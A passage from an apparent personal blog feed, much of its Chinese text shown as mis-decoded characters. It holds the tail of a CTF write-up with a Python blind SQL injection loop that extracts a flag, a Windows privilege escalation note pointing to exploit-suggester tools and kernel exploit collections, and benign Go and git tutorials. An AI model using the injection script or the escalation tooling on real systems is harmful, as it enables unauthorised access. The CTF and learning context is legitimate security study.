class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">f&quot;(ord(substr((select(group_concat(password))from(F1naI1y)where((password)regexp&#x27;flag&#x27;)),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;j&#125;</span>)&quot;</span><br>        response=requests.get(url=url+sql,timeout=<span class="hljs-number">3</span>)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439460.png" alt="image-20240303234305001"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows ææƒ</title>
      <link href="/2024/02/29/Windows-%E6%8F%90%E6%9D%83/"/>
      <url>/2024/02/29/Windows-%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="windowsæƒé™åˆ’åˆ†"><a href="#Windowsæƒé™åˆ’åˆ†" class="headerlink" title="Windowsæƒé™åˆ’åˆ†"></a>Windowsæƒé™åˆ’åˆ†</h1><p>åœ¨Windowsä¸­ï¼Œæœ‰Userã€Administratorã€Systemã€TrustedInstallerè¿™å››ç§ç”¨æˆ·æƒé™ï¼Œå…¶æƒé™ä»å·¦åˆ°å³ä¾æ¬¡å‡é«˜ã€‚</p><p>æƒé™æå‡åˆ†ä¸ºä¸‹é¢ä¸¤ç±»ï¼š</p><ul><li>çºµå‘æå–ï¼šä½æƒé™ç”¨æˆ·è·å¾—é«˜æƒé™ç”¨æˆ·çš„æƒé™</li><li>æ¨ªå‘ææƒï¼šè·å¾—åŒçº§åˆ«è§’è‰²çš„æƒé™</li></ul><p><strong>å¸¸ç”¨ææƒæ–¹æ³•</strong></p><ul><li>Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</li><li>é”™è¯¯ç³»ç»Ÿé…ç½®ææƒ</li><li>æ•°æ®åº“ææƒ</li><li>ç­‰ç­‰~</li></ul><h1 id="windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"><a href="#Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ" class="headerlink" title="Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"></a>Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</h1><p>æº¢å‡ºæ¼æ´æ˜¯ä¸€ç§è®¡ç®—æœºç¨‹åºçš„å¯æ›´æ­£æ€§ç¼ºé™·ã€‚æº¢å‡ºæ¼æ´çš„å…¨å:ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å› ä¸ºå®ƒæ˜¯åœ¨ç¨‹åºæ‰§è¡Œçš„ä¹Ÿæ˜¯æ”»å‡»è€…æ—¶å€™åœ¨ç¼“å†²åŒºæ‰§è¡Œçš„é”™è¯¯ä»£ç ï¼Œæ‰€ä»¥å«ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ç¼“å†²æº¢å‡ºæ˜¯æœ€å¸¸è§çš„å†…å­˜é”™è¯¯ä¹‹ä¸€ï¼Œå…¥ä¾µç³»ç»Ÿæ—¶æ‰€ç”¨åˆ°çš„æœ€å¼ºå¤§ã€æœ€ç»å…¸çš„ä¸€ç±»æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚æˆåŠŸåœ°åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´å¯!ä¿®æ”¹å†…å­˜ä¸­å˜é‡çš„å€¼ï¼Œç”šè‡³å¯ä»¥åŠ«æŒè¿›ç¨‹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œæœ€ç»ˆè·å¾—ä¸»æœºçš„æ§åˆ¶æƒã€‚åˆ©ç”¨Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒæ˜¯ä¸€ç§å¾ˆé€šç”¨çš„ææƒæ–¹æ³•ï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡ç³»ç»Ÿä¸­çš„æ‰€æœ‰å®‰å…¨é™åˆ¶ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®æ˜¯ç›®æ ‡ç³»ç»Ÿæœ‰æ²¡æœ‰åŠæ—¶å®‰è£…è¡¥ä¸ï¼Œå¦‚æœç›®æ ‡ç³»ç»Ÿæ²¡æœ‰å®‰è£…æŸä¸€æ¼æ´çš„è¡¥ä¸ä¸”å­˜åœ¨è¯¥æ¼æ´çš„è¯ï¼Œæ”»å‡»è€…å°±ä¼šå‘ç›®æ ‡ç³»ç»Ÿä¸Šä¼ æœ¬åœ°æº¢å‡ºç¨‹åºï¼Œæº¢å‡ºAdministratoræƒé™ã€‚</p><h2 id="æ‰‹åŠ¨æŸ¥çœ‹ç³»ç»Ÿæ¼æ´"><a href="#æ‰‹åŠ¨æŸ¥çœ‹ç³»ç»Ÿæ¼æ´" class="headerlink" title="æ‰‹åŠ¨æŸ¥çœ‹ç³»ç»Ÿæ¼æ´"></a>æ‰‹åŠ¨æŸ¥çœ‹ç³»ç»Ÿæ¼æ´</h2><p>è·å¾—ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„shellä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€äº›å‘½ä»¤æ¥æŸ¥çœ‹ç³»ç»Ÿæœ‰å“ªäº›è¡¥ä¸</p><ol><li><p>systeminfo</p><p><img src="http://cdn.clown2024.cn/202407151445483.png" alt="image-20240229111338484"></p></li><li><p>wmic qfe get caption,description,hotfixid,installedon</p><p><img src="http://cdn.clown2024.cn/202407151445485.png" alt="image-20240229111417594"></p></li></ol><h2 id="ææƒè¾…åŠ©å·¥å…·"><a href="#ææƒè¾…åŠ©å·¥å…·" class="headerlink" title="ææƒè¾…åŠ©å·¥å…·"></a>ææƒè¾…åŠ©å·¥å…·</h2><ol><li><p><strong>ä½¿ç”¨Windows-Exploit-Suggesterè§£æsysteminfo</strong>ï¼š<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><p>è¯¥å·¥å…·å¯ä»¥è§£æsysteminfoå‡ºæ¥çš„æ•°æ®çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</p><p>ä½¿ç”¨æ­¥éª¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./windows-exploit-suggester.py --update  #ç”¨æ¥æ›´æ–°æ¼æ´åº“<br>pip install xlrd --upgrade  #å¦‚æœæ²¡æœ‰è¯¥ä¾èµ–å¯ä»¥è¿›è¡Œå®‰è£…<br>./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt  #æä¾›æˆ‘ä»¬ä¿å­˜çš„systeminfoè¾“å‡ºçš„æ–‡æœ¬æ–‡ä»¶ï¼Œç„¶åæŒ‡å‘å¾®è½¯æ•°æ®åº“<br></code></pre></td></tr></table></figure></li><li><p>Windowsææƒæ¼æ´åˆé›†ï¼š<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>å„å¤§å¹³å°ææƒå·¥å…·ï¼š<a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></p></li></ol><h1 id="ç³»ç»Ÿæƒé™é…ç½®é”™è¯¯"><a href="#ç³»ç»Ÿæƒé™é…ç½®é”™è¯¯" class="headerlink" title="ç³»ç»Ÿæƒé™é…ç½®é”™è¯¯"></a>ç³»ç»Ÿæƒé™é…ç½®é”™è¯¯</h1>]]></content>
      
      
      <categories>
          
          <category> ææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go getå°å‘</title>
      <link href="/2024/02/27/go-get%E5%B0%8F%E5%9D%91/"/>
      <url>/2024/02/27/go-get%E5%B0%8F%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="ginæ¡†æ¶å®‰è£…"><a href="#ginæ¡†æ¶å®‰è£…" class="headerlink" title="ginæ¡†æ¶å®‰è£…"></a>ginæ¡†æ¶å®‰è£…</h1><p>å°è¯•æœ¬åœ°å»è·‘ä¸€ä¸ªgoé¡¹ç›®æ—¶ï¼Œåœ¨å¯¼å…¥åŒ…æ—¶æç¤ºæ‰¾ä¸åˆ°è·¯å¾„æ‰¾ä¸åˆ°å¯¹åº”çš„åŒ…</p><p>å…ˆç”¨ä¸‹åˆ—å‘½ä»¤å¼€å¯äº†ç¯å¢ƒå˜é‡GO111MODULE&#x3D;onï¼Œä¸ç„¶go getä¸äº†</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env -w GO111MODULE=on<br></code></pre></td></tr></table></figure><p>ç„¶ågetç›¸åº”çš„åŒ…</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go get -u github.com/chromedp/chromedp<br>go get -u github.com/gin-gonic/gin<br>go get -u golang.org/x/net/html<br></code></pre></td></tr></table></figure><p>å†go buildæºç æ—¶å°±å‡ºç°äº†ä¸‹é¢çš„é”™è¯¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">main.go:13:2: cannot find package &quot;github.com/chromedp/chromedp&quot; in any of: D:\go\src\github.com\chromedp\chromedp (from $GOROOT) C:\Users\86189\go\src\github.com\chromedp\chromedp (from $GOPATH)<br></code></pre></td></tr></table></figure><h1 id="æŸ¥çœ‹ç¯å¢ƒå˜é‡"><a href="#æŸ¥çœ‹ç¯å¢ƒå˜é‡" class="headerlink" title="æŸ¥çœ‹ç¯å¢ƒå˜é‡"></a>æŸ¥çœ‹ç¯å¢ƒå˜é‡</h1><p>ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹goç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440880.png" alt="image-20240227171305349"></p><p>å‘ç°gopathæ²¡æœ‰æŒ‡å‘æˆ‘å®‰è£…æ—¶è®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œå»ç¯å¢ƒå˜é‡è®¾ç½®çš„åœ°æ–¹æŸ¥çœ‹ä¸€ä¸‹<img src="http://cdn.clown2024.cn/202407151509348.png" alt="image-20240227171421124"></p><p>ä¼šå‘ç°ç”¨æˆ·å˜é‡è¿˜æœ‰ä¸€ä¸ªgopathæŒ‡å‘é»˜è®¤çš„åœ°æ–¹ï¼Œåˆ æ‰å³å¯</p><p>ç°åœ¨å†ä½¿ç”¨go envæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°æˆåŠŸä¿®æ”¹</p><p><img src="http://cdn.clown2024.cn/202407151440882.png" alt="image-20240227171518116"></p><p>ç„¶åå†å»é‡æ–°getä¸€éå³å¯</p><blockquote><p>å¼€å¯äº†ç¯å¢ƒå˜é‡GO111MODULE&#x3D;onï¼Œä¼šå°†go getçš„æ–‡ä»¶ä¸‹è½½åˆ°GOPATH&#x2F;pkg&#x2F;modé‡Œ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitå­¦ä¹ </title>
      <link href="/2024/01/25/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/25/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="gitå­¦ä¹ "><a href="#Gitå­¦ä¹ " class="headerlink" title="Gitå­¦ä¹ "></a>Gitå­¦ä¹ </h1><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå¥½çš„æ€»ç»“ç½‘ç«™ï¼š<a href="https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA">https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA</a></p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><ol><li>gitåœ¨å®é™…å¼€å‘ä¸­çš„è¿ç”¨åœºæ™¯éå¸¸å¤šï¼Œæ¯”å¦‚ï¼šå¤‡ä»½ï¼Œä»£ç è¿˜åŸï¼ŒååŒå¼€å‘ï¼Œè¿½æº¯é—®é¢˜ä»£ç çš„ç¼–å†™äººå’Œæ—¶é—´ã€‚</li></ol><p>&#x3D;&#x3D;ç‰ˆæœ¬æ§åˆ¶å™¨çš„æ–¹å¼&#x3D;&#x3D;</p><blockquote><p>a.é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œæ¯”å¦‚ï¼šsvnï¼Œcvs</p><p>b.åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œæ¯”å¦‚ï¼šgit</p><p>äºŒè€…çš„å·®åˆ«å¾ˆå¤§ï¼Œé›†ä¸­å¼ä¸­ï¼Œç‰ˆæœ¬åº“æ˜¯å­˜æ”¾åœ¨ä¸­å¤®æœåŠ¡å™¨ä¸­çš„ï¼Œéœ€è¦çš„ä»£ç éƒ½æ˜¯æäº¤åˆ°ä¸­å¤®æœåŠ¡å™¨æˆ–ä»ä¸­å¤®æœåŠ¡å™¨ä¸‹è½½ï¼›åˆ†å¸ƒå¼ä¸­åˆ™æ²¡æœ‰ä¸­å¤®æœåŠ¡å™¨ï¼Œä¼šæœ‰ä¸€ä¸ªå…±äº«æœåŠ¡å™¨ï¼Œæ¯å°ç”µè„‘éƒ½æœ‰è‡ªå·±çš„æœ¬åœ°ä»“åº“å­˜æ”¾ç€è‡ªå·±çš„ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬åº“ã€‚</p></blockquote><h2 id="gitçš„é…ç½®"><a href="#gitçš„é…ç½®" class="headerlink" title="gitçš„é…ç½®"></a>gitçš„é…ç½®</h2><p>&#x3D;&#x3D;è®¾ç½®ç”¨æˆ·ä¿¡æ¯&#x3D;&#x3D;</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E9%85%8D%E7%BD%AE.png"></p><blockquote><p>å½“ä¸è·Ÿè®¾ç½®ä¿¡æ¯çš„åç§°æ—¶å°±æ˜¯æŸ¥è¯¢ç”¨æˆ·çš„ä¿¡æ¯</p></blockquote><h2 id="ç»™å¸¸ç”¨å‘½ä»¤è®¾ç½®ä¸€ä¸ªåˆ«å"><a href="#ç»™å¸¸ç”¨å‘½ä»¤è®¾ç½®ä¸€ä¸ªåˆ«å" class="headerlink" title="ç»™å¸¸ç”¨å‘½ä»¤è®¾ç½®ä¸€ä¸ªåˆ«å"></a>ç»™å¸¸ç”¨å‘½ä»¤è®¾ç½®ä¸€ä¸ªåˆ«å</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#åˆ›å»ºä¸€ä¸ª.bashrcæ–‡ä»¶ï¼Œåœ¨é‡Œé¢è®¾ç½®åˆ«å</span><br><span class="hljs-built_in">touch</span> ~/.bashrc<br>vim .bashrc<br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E8%AE%BE%E7%BD%AE%E5%88%AB%E5%90%8D.png"></p><h2 id="è·å–æœ¬åœ°ä»“åº“"><a href="#è·å–æœ¬åœ°ä»“åº“" class="headerlink" title="è·å–æœ¬åœ°ä»“åº“"></a>è·å–æœ¬åœ°ä»“åº“</h2><ol><li>æ–°å»ºä¸€ä¸ªç›®å½•ä½œä¸ºæœ¬åœ°ä»“åº“ï¼Œè¿™é‡Œç›´æ¥åœ¨æ¡Œé¢å»ºä¸€ä¸ªgit_testç›®å½•</li><li>ç”¨ git init åˆå§‹åŒ–æœ¬åœ°ä»“åº“<img src="https://gitee.com/ljc0033/magic/raw/master/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93.png"></li></ol><p>â€‹         èƒ½çœ‹åˆ°.gitæ–‡ä»¶å°±æˆåŠŸäº†</p><h2 id="gitçš„å¸¸ç”¨å‘½ä»¤"><a href="#gitçš„å¸¸ç”¨å‘½ä»¤" class="headerlink" title="gitçš„å¸¸ç”¨å‘½ä»¤"></a>gitçš„å¸¸ç”¨å‘½ä»¤</h2><p>Gitå·¥ä½œç›®å½•ä¸‹å¯¹äºæ–‡ä»¶çš„ä¿®æ”¹ä¼šå­˜åœ¨å‡ ä¸ªçŠ¶æ€(é™¤äº†.gitç›®å½•çš„éƒ½å«å·¥ä½œç›®å½•)</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81.png"></p><p>æ¥ä¸‹æ¥æ–°å»ºä¸€ä¸ªfile01.txtæ–‡ä»¶æ¥è¿›è¡Œæµ‹è¯•å‘½ä»¤ï¼Œç”¨touchæŒ‡ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#æŸ¥çœ‹gitçŠ¶æ€</span><br>git status<br><span class="hljs-comment">#æ·»åŠ åˆ°ç¼“å­˜åŒº</span><br>git add file01.txt        <span class="hljs-comment">#ä¹Ÿå¯ä»¥ç”¨.é€šé…ç¬¦ï¼Œè¡¨ç¤ºæ·»åŠ æ‰€æœ‰</span><br><span class="hljs-comment">#æäº¤åˆ°ä»“åº“</span><br>git commit -m <span class="hljs-string">&quot;æ³¨é‡Š&quot;</span><br><span class="hljs-comment">#æŸ¥çœ‹å†å²æ—¥å¿—</span><br>git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81%E6%94%B9%E5%8F%98.png"></p><blockquote><p>git log [option]è¿˜æœ‰æ›´å¤šçš„å‚æ•°ï¼Œè¿™é‡Œè¯¦ç»†åˆ—å‡ºæ¥</p><ul><li>â€“all  æ˜¾ç¤ºæ‰€æœ‰åˆ†æ”¯</li><li>â€“pretty&#x3D;oneline   å°†æäº¤ä¿¡æ¯æ˜¾ç¤ºä¸ºä¸€è¡Œ</li><li>â€“abbrev-commit  ä½¿å¾—è¾“å‡ºçš„commitidæ›´ç®€çŸ­</li><li>â€“graph     ä»¥å›¾çš„å½¢å¼æ˜¾ç¤º</li></ul></blockquote><p>&#x3D;&#x3D;ç‰ˆæœ¬å›é€€&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git reset --hard commitID<br><span class="hljs-comment">#æŸ¥çœ‹å·²ç»åˆ é™¤çš„è®°å½•</span><br>git reflog     <span class="hljs-comment">#è¿™ä¸ªå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ“ä½œè®°å½•</span><br></code></pre></td></tr></table></figure><blockquote><p>commitIDå¯ä»¥ç”¨git logæŸ¥çœ‹</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151440099.png"></p><p>&#x3D;&#x3D;æ·»åŠ æ–‡ä»¶è‡³å¿½ç•¥&#x3D;&#x3D;</p><p>æœ‰äº›æ–‡ä»¶æˆ‘ä»¬ä¸éœ€è¦gitç®¡ç†ï¼Œå¯ä»¥å°†ä»–ä»¬æ·»åŠ åˆ°gitignoreæ–‡ä»¶ä¸­å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> .gitignore<br></code></pre></td></tr></table></figure><p>ä¸€äº›ç¤ºä¾‹<img src="http://cdn.clown2024.cn/202407151440100.png"></p><h2 id="gitåˆ†æ”¯"><a href="#gitåˆ†æ”¯" class="headerlink" title="gitåˆ†æ”¯"></a>gitåˆ†æ”¯</h2><p>å‡ ä¹æ‰€æœ‰çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿéƒ½ä»¥æŸç§å½¢å¼æ”¯æŒåˆ†æ”¯ã€‚ ä½¿ç”¨åˆ†æ”¯æ„å‘³ç€ä½ å¯ä»¥æŠŠä½ çš„å·¥ä½œä»å¼€å‘ä¸»çº¿ä¸Šåˆ†ç¦»å¼€æ¥ï¼Œ ä»¥å…å½±å“å¼€å‘ä¸»çº¿ã€‚</p><ul><li><p>å¸¸ç”¨åˆ†æ”¯ç›¸å…³å‘½ä»¤</p><ul><li><p>æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯</p><p>git branch</p></li><li><p>åˆ›å»ºæœ¬åœ°åˆ†æ”¯</p><p>git branch åˆ†æ”¯å</p></li><li><p>åˆ‡æ¢åˆ†æ”¯</p><p>git checkout åˆ†æ”¯å</p><p>git checkout -b åˆ†æ”¯å  (ç›´æ¥åˆ‡æ¢åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„åˆ†æ”¯å¹¶åˆ›å»ºè¯¥åˆ†æ”¯)</p></li><li><p>åˆå¹¶åˆ†æ”¯</p><p>ä¸€ä¸ªåˆ†æ”¯ä¸Šçš„æäº¤å¯ä»¥åˆå¹¶åˆ°å¦ä¸€ä¸ªåˆ†æ”¯</p><p>git merge åˆ†æ”¯åç§°</p><blockquote><p>æ¯”å¦‚devåˆ†æ”¯è¦åˆå¹¶åˆ°masteréœ€è¦å…ˆåˆ‡æ¢åˆ°masterä¸»çº¿ï¼Œå†get merge dev</p></blockquote></li><li><p>åˆ é™¤åˆ†æ”¯</p><p><strong>ä¸èƒ½åˆ é™¤å½“å‰åˆ†æ”¯ï¼Œåªèƒ½åˆ é™¤å…¶ä»–åˆ†æ”¯</strong></p><p>git branch -d b1  åˆ é™¤åˆ†æ”¯æ—¶ï¼Œéœ€è¦åšå„ç§æ£€æŸ¥</p><p>git branch -D b1 ä¸åšä»»ä½•æ£€æŸ¥ï¼Œå¼ºåˆ¶åˆ é™¤</p></li></ul></li></ul><h2 id="gitè¿œç¨‹ä»“åº“"><a href="#gitè¿œç¨‹ä»“åº“" class="headerlink" title="gitè¿œç¨‹ä»“åº“"></a>gitè¿œç¨‹ä»“åº“</h2><p>è¿™æ˜¯ä¸€ä¸ªæ€»ç»“çš„å·¥ä½œæµç¨‹å›¾ï¼š<img src="http://cdn.clown2024.cn/202407151440101.png" alt="image-20240123132413459"></p><h3 id="ä½¿ç”¨sshç»‘å®šgitee"><a href="#ä½¿ç”¨sshç»‘å®šgitee" class="headerlink" title="ä½¿ç”¨sshç»‘å®šgitee"></a>ä½¿ç”¨sshç»‘å®šgitee</h3><ol><li><p>ç”¨gitæ¥ç»‘å®šgiteeï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//ç”Ÿæˆsshå…¬é’¥ï¼Œå¯ä»¥ä½¿ç”¨-få‚æ•°æŒ‡å®šç”Ÿæˆçš„æ–‡ä»¶åï¼Œæ¯”å¦‚ï¼š-f &quot;id_rsa_gitee&quot;<br>ssh-keygen -t rsa//ç”Ÿæˆçš„sshå¯†é’¥ä¼šé»˜è®¤åœ¨~/.sshä¸‹é¢ï¼Œå¦‚æœç”Ÿæˆè¿‡äº†ä¹Ÿä¼šç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥æœ‰å¤šä¸ªå¯†é’¥æ—¶è¦è®°å¾—å¤‡ä»½(åœ¨Windowsçš„cç›˜ç”¨æˆ·ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°)<br></code></pre></td></tr></table></figure></li><li><p>Giteeè®¾ç½®å…¬é’¥</p><p>å°†~&#x2F;.sshä¸‹çš„id_rsa.pubå…¬é’¥å¤åˆ¶åˆ°ä¸‹é¢çš„åœ°æ–¹</p><p><img src="http://cdn.clown2024.cn/202407151440102.png" alt="image-20240125154416297"></p></li><li><p>ç»‘å®šä¹‹åå¯ä»¥å»éªŒè¯sshèƒ½å¦è¿æ¥åˆ°giteeï¼Œè¿™é‡Œé€‰æ‹©ç”¨åœ¨~&#x2F;.sshä¸‹æ–°å»ºä¸€ä¸ªconfigæ–‡ä»¶æ¥é…ç½®ï¼Œè¿™æ ·å¯ä»¥è¿æ¥giteeä¹Ÿè¡Œã€githubä¹Ÿè¡Œï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_40402743/article/details/124484633">https://blog.csdn.net/weixin_40402743/article/details/124484633</a></p><p><img src="http://cdn.clown2024.cn/202407151440103.png" alt="image-20240125170039569"></p><p>configæ–‡ä»¶ä¸­çš„é…ç½®å¦‚ä¸‹ï¼Œæˆ‘é…githubçš„æ—¶å€™é…ç½®äº†é‚®ç®±ï¼Œgiteeåˆ™æ²¡æœ‰</p><p><img src="http://cdn.clown2024.cn/202407151440104.png" alt="image-20240125170137353"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#github<br>Host github.com<br>User &lt;ç”Ÿæˆå¯†é’¥æ—¶æŒ‡å®šçš„é‚®ç®±é‚®ç®±&gt;<br>Hostname ssh.github.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_github<br>Port 443<br><br>#gitee<br>Host gitee.com<br>HostName gitee.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_gitee<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<strong>ssh -T <a href="mailto:&#x67;&#x69;&#116;&#x40;&#103;&#105;&#116;&#101;&#101;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#x40;&#103;&#105;&#116;&#101;&#101;&#46;&#x63;&#x6f;&#109;</a></strong>éªŒè¯<img src="http://cdn.clown2024.cn/202407151440105.png" alt="image-20240125170434757"></p></li></ol><h3 id="è¿œç¨‹ä»“åº“æ“ä½œ"><a href="#è¿œç¨‹ä»“åº“æ“ä½œ" class="headerlink" title="è¿œç¨‹ä»“åº“æ“ä½œ"></a>è¿œç¨‹ä»“åº“æ“ä½œ</h3><p><strong>æ·»åŠ è¿œç¨‹ä»“åº“</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git remote add &lt;èµ·çš„åå­—&gt; &lt;ä»“åº“åœ°å€&gt;<br>//git remote å¯ä»¥æŸ¥çœ‹å½“å‰çš„è¿œç¨‹ä»“åº“<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440106.png" alt="image-20240125174304783"></p><p><strong>æ¨é€è¿œç¨‹ä»“åº“</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git push &lt;è‡ªå·±å‘½åçš„åç§°&gt; &lt;åˆ†æ”¯&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440107.png" alt="image-20240125180131766"></p><p>è¿™æ˜¯è¿œç¨‹æ¨é€çš„å®Œæ•´æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git push [-f] [--set-upstream] [è¿œç«¯åç§° [æœ¬åœ°åˆ†æ”¯å]:[è¿œç«¯åˆ†æ”¯å]]#å¦‚æœæœ¬åœ°å’Œè¿œç«¯åˆ†æ”¯åä¸€è‡´å°±å¯ä»¥çœç•¥ä¸€ä¸ªï¼Œåƒä¸Šé¢ä¸€æ ·<br></code></pre></td></tr></table></figure><ul><li><p>-fè¡¨ç¤ºå¼ºåˆ¶æ¨é€ï¼Œå’Œè¿œç«¯ä»£ç ä¿®æ”¹åŒä¸€å—åœ°æ–¹æ—¶å¯èƒ½ä¼šå‡ºç°å†²çªã€‚</p></li><li><p>â€“set-upstreamï¼šæ¨é€åˆ°è¿œç«¯çš„åŒæ—¶å¹¶ä¸”å»ºç«‹å’Œè¿œç«¯åˆ†æ”¯çš„å…³è”å…³ç³»ï¼Œè¿™æ ·å½“å½“å‰åˆ†æ”¯å·²ç»å’Œè¿œç«¯åˆ†æ”¯å…³è”æ—¶ï¼Œåˆ™å¯ä»¥çœç•¥åˆ†æ”¯åå’Œè¿œç«¯å<img src="http://cdn.clown2024.cn/202407151440108.png" alt="image-20240125182248016"></p><p><img src="http://cdn.clown2024.cn/202407151440109.png" alt="image-20240125183254456"></p></li></ul><p><strong>å…‹éš†è¿œç¨‹ä»“åº“</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git clone &lt;ä»“åº“è·¯å¾„&gt; [æœ¬åœ°ç›®å½•]<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æŒ‡å®šç›®å½•çš„è¯ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªé»˜è®¤ç›®å½•ï¼Œæ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs 